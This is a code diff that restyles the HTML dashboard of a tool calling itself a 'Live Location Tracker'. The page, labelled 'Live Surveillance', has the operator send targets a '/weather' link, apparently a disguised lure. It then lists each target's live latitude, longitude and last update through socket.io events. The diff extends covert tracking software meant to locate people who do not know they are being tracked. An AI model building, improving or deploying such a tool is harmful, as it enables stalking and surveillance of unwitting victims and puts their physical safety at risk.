@@ -4,26 +4,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
+    <title>Live Location Tracker</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <style>
+        :root {
+            --bg: #060816;
+            --bg-soft: #111827;
+            --panel: rgba(17, 24, 39, 0.78);
+            --panel-strong: rgba(15, 23, 42, 0.95);
+            --line: rgba(148, 163, 184, 0.18);
+            --text: #e5eefb;
+            --muted: #8ba1c7;
+            --accent: #60a5fa;
+            --accent-2: #34d399;
+            --warn: #fbbf24;
+            --danger: #f87171;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: radial-gradient(circle at top, rgba(96,165,250,.18), transparent 35%), linear-gradient(135deg, #050816 0%, #0f172a 45%, #020617 100%);
+            color: var(--text);
+            font-family: Inter, Arial, sans-serif;
+        }
+
+        .page {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 32px 20px 60px;
+        }
+
+        .hero {
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid var(--line);
+            border-radius: 24px;
+            box-shadow: 0 18px 42px rgba(0,0,0,0.4);
+            padding: 28px;
+            margin-bottom: 24px;
+            backdrop-filter: blur(12px);
+        }
+
+        .eyebrow {
+            display: inline-block;
+            padding: 7px 12px;
+            border-radius: 999px;
+            background: rgba(96,165,250,0.12);
+            color: #bfdbfe;
+            letter-spacing: 0.08em;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        h1 {
+            font-size: clamp(2.1rem, 4vw, 3.3rem);
+            margin: 14px 0 8px;
+            font-weight: 800;
+        }
+
+        .subhead {
+            color: var(--muted);
+            font-size: 1rem;
+        }
+
+        .url-box {
+            margin-top: 20px;
+            background: rgba(2,6,23,0.7);
+            border: 1px solid var(--line);
+            border-radius: 14px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        code {
+            background: rgba(148,163,184,.08);
+            border: 1px solid rgba(148,163,184,.18);
+            padding: 8px 12px;
+            border-radius: 10px;
+            color: #dbeafe;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        .targets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 18px;
+            margin-top: 18px;
+        }
+
+        .target-card {
+            display: block;
+            background: var(--panel);
+            border: 1px solid var(--line);
+            border-radius: 18px;
+            padding: 18px 18px 16px;
+            color: var(--text);
+            text-decoration: none;
+            box-shadow: 0 14px 28px rgba(0,0,0,0.2);
+            transition: transform .2s ease, border-color .2s ease, box-shadow .2s ease;
+        }
+
+        .target-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(96,165,250,.5);
+            box-shadow: 0 14px 32px rgba(59,130,246,.12);
+        }
+
+        .target-header {
+            display: flex; justify-content: space-between; align-items: center; gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        .target-id {
+            font-weight: 800;
+            font-size: 1.2rem;
+            letter-spacing: 0.02em;
+        }
+
+        .status-dot {
+            width: 10px; height: 10px; border-radius: 50%;
+            background: var(--accent-2); box-shadow: 0 0 0 6px rgba(52,211,153,.12);
+        }
+
+        .target-meta {
+            color: var(--muted);
+            font-size: 0.9rem;
+            line-height: 1.8;
+        }
+
+        .empty {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px dashed rgba(148,163,184,.35);
+            border-radius: 18px;
+            padding: 30px 18px;
+            text-align: center;
+            color: var(--muted);
+        }
+    </style>
 </head>
 
 <body>
-    <header class="has-background-black p-3 has-text-centered">
-        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
-        <a href="http://madhanmaaz.netlify.app/" class="is-block mb-2">Created by madhanmaaz</a>
-        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
-    </header>
+    <div class="page">
+        <header class="hero">
+            <span class="eyebrow">Live Surveillance</span>
+            <h1>Live Location Tracker</h1>
+            <p class="subhead">Monitor active targets in real time with instant GPS updates and map visualization.</p>
+            <div class="url-box">
+                <span>Target endpoint</span>
+                <code>{{ remoteURL }}/weather</code>
+            </div>
+        </header>
 
-    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
-        <h1 class="title is-5">Targets</h1>
-
-        {{ for(value, key in TARGETS) }}
-        <a href="/map?id={{ key }}" class="button is-fullwidth">
-            {{ key }}
-        </a>
-        {{/}}
-    </section>
+        <section>
+            <div id="tar-content" class="targets-grid">
+                {{ for(value, key in TARGETS) }}
+                <a href="/map?id={{ key }}" class="target-card">
+                    <div class="target-header">
+                        <span class="target-id">{{ key }}</span>
+                        <span class="status-dot" title="online"></span>
+                    </div>
+                    <div class="target-meta">
+                        <div>Lat: {{ value.lat }}</div>
+                        <div>Lng: {{ value.lng }}</div>
+                        <div>Updated: {{ value.lastUpdated }}</div>
+                    </div>
+                </a>
+                {{/}}
+            </div>
+        </section>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
     <script>
@@ -34,12 +191,65 @@
             transports: ['websocket']
         })
 
+        function formatTime(ts) {
+            if (!ts) return 'just now'
+            const diff = Date.now() - Number(ts)
+            const seconds = Math.max(0, Math.floor(diff / 1000))
+            if (seconds < 60) return `${seconds}s ago`
+            const minutes = Math.floor(seconds / 60)
+            if (minutes < 60) return `${minutes}m ago`
+            const hours = Math.floor(minutes / 60)
+            return `${hours}h ago`
+        }
+
+        function renderTarget(id, data) {
+            const card = document.createElement('a')
+            card.href = `/map?id=${id}`
+            card.className = 'target-card'
+            card.innerHTML = `
+                <div class="target-header">
+                    <span class="target-id">${id}</span>
+                    <span class="status-dot" title="online"></span>
+                </div>
+                <div class="target-meta">
+                    <div>Lat: ${Number(data.lat).toFixed(5)}</div>
+                    <div>Lng: ${Number(data.lng).toFixed(5)}</div>
+                    <div>Updated: ${formatTime(data.lastUpdated)}</div>
+                </div>
+            `
+            return card
+        }
+
+        const seen = new Map()
+
         socket.on("user-connected", newId => {
-            const a = document.createElement('a')
-            a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth"
-            a.innerText = newId
-            content.appendChild(a)
+            if (!seen.has(newId)) {
+                seen.set(newId, true)
+                content.appendChild(renderTarget(newId, { lat: 0, lng: 0, lastUpdated: Date.now() }))
+            }
+        })
+
+        socket.on("map-data", data => {
+            const existing = [...content.querySelectorAll('.target-card')].find(el => {
+                return el.href.includes(`id=${data.id}`)
+            })
+
+            if (!existing) {
+                content.appendChild(renderTarget(data.id, data))
+                return
+            }
+
+            existing.innerHTML = `
+                <div class="target-header">
+                    <span class="target-id">${data.id}</span>
+                    <span class="status-dot" title="online"></span>
+                </div>
+                <div class="target-meta">
+                    <div>Lat: ${Number(data.lat).toFixed(5)}</div>
+                    <div>Lng: ${Number(data.lng).toFixed(5)}</div>
+                    <div>Updated: ${formatTime(data.lastUpdated)}</div>
+                </div>
+            `
         })
     </script>
 </body>
